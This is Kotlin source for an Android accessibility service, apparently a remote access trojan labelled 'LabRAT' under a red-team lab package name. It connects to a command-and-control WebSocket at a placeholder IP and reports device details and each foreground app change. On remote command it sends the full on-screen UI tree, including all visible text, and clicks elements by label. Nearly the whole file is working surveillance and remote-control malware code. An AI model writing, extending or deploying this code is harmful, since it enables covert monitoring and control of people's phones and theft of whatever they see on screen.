package com.labredteam.devicesecurityverifier


import android.accessibilityservice.AccessibilityService
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.google.gson.Gson
import okhttp3.*
import okhttp3.WebSocketListener
import java.util.concurrent.TimeUnit
import kotlin.collections.get

class LabAccessibilityService : AccessibilityService() {

    companion object {
        var instance: LabAccessibilityService? = null
        private const val TAG = "LabRAT"
    }

    private var webSocket: WebSocket? = null
    private val gson = Gson()
    private val deviceId = "lab_device_${System.currentTimeMillis()}"
    private var currentForegroundPackage: String? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i(TAG, "=== SERVIÇO DE ACESSIBILIDADE INICIADO ===")
        connectToC2()
    }

    private fun connectToC2() {
        val client = OkHttpClient.Builder()
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .build()

        // ⚠️ ALTERE AQUI PARA O IP DO SEU SERVIDOR C2
        val request = Request.Builder()
            .url("ws://SEU_IP_AQUI:8765")   // Exemplo: ws://192.168.1.10:8765
            .build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.i(TAG, "Conectado ao servidor C2")
                sendRegisterMessage()
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                handleCommand(text)
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "Falha na conexão WebSocket: ${t.message}")
            }
        })
    }

    private fun sendRegisterMessage() {
        val register = mapOf(
            "type" to "register",
            "device_id" to deviceId,
            "android_version" to Build.VERSION.RELEASE,
            "model" to Build.MODEL
        )
        webSocket?.send(gson.toJson(register))
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val packageName = event.packageName?.toString()
                if (packageName != null && packageName != currentForegroundPackage) {
                    currentForegroundPackage = packageName
                    Log.i(TAG, "App em primeiro plano: $packageName")
                    sendEventToC2("foreground_app_changed", mapOf("package" to packageName))
                }
            }
            else -> {}
        }
    }

    private fun sendEventToC2(eventType: String, data: Map<String, Any?>) {
        val event = mapOf(
            "type" to "event",
            "event_type" to eventType,
            "package" to currentForegroundPackage,
            "data" to data,
            "timestamp" to System.currentTimeMillis()
        )
        webSocket?.send(gson.toJson(event))
    }

    private fun handleCommand(json: String) {
        try {
            val cmd = gson.fromJson(json, Map::class.java)
            when (cmd["cmd"]) {
                "get_foreground_app" -> {
                    sendEventToC2("current_foreground", mapOf<String, Any?>("package" to currentForegroundPackage))
                }
                "get_ui_tree" -> sendCurrentUITree()
                "perform_click_text" -> {
                    val text = cmd["text"] as? String
                    if (text != null) findAndClickByText(text)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao processar comando: ${e.message}")
        }
    }

    private fun sendCurrentUITree() {
        val root = rootInActiveWindow ?: return
        val tree = extractNodeInfo(root)
        sendEventToC2("ui_tree", mapOf("tree" to tree))
        root.safeRecycle()
    }

    private fun extractNodeInfo(node: AccessibilityNodeInfo?, depth: Int = 0): Map<String, Any> {
        if (node == null) return emptyMap()

        val info = mutableMapOf<String, Any>()
        info["text"] = node.text?.toString() ?: ""
        info["contentDescription"] = node.contentDescription?.toString() ?: ""
        info["className"] = node.className?.toString() ?: ""
        info["packageName"] = node.packageName?.toString() ?: ""
        info["isClickable"] = node.isClickable
        info["depth"] = depth

        val children = mutableListOf<Map<String, Any>>()
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                children.add(extractNodeInfo(child, depth + 1))
                child.safeRecycle()
            }
        }
        if (children.isNotEmpty()) info["children"] = children

        return info
    }

    private fun findAndClickByText(targetText: String) {
        val root = rootInActiveWindow ?: return
        val clicked = findAndClickRecursive(root, targetText)
        Log.i(TAG, "Clique em '$targetText' → Sucesso: $clicked")
        root.safeRecycle()
    }

    private fun findAndClickRecursive(node: AccessibilityNodeInfo?, target: String): Boolean {
        if (node == null) return false

        val text = node.text?.toString() ?: ""
        val desc = node.contentDescription?.toString() ?: ""

        if (text.equals(target, ignoreCase = true) || desc.equals(target, ignoreCase = true)) {
            if (node.isClickable) {
                return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (findAndClickRecursive(child, target)) {
                child.safeRecycle()
                return true
            }
            child.safeRecycle()
        }
        return false
    }

    private fun AccessibilityNodeInfo?.safeRecycle() {
        if (this != null && Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
            @Suppress("DEPRECATION")
            this.recycle()
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Serviço interrompido")
    }

    override fun onDestroy() {
        super.onDestroy()
        webSocket?.close(1000, "Serviço finalizado")
        instance = null
    }
}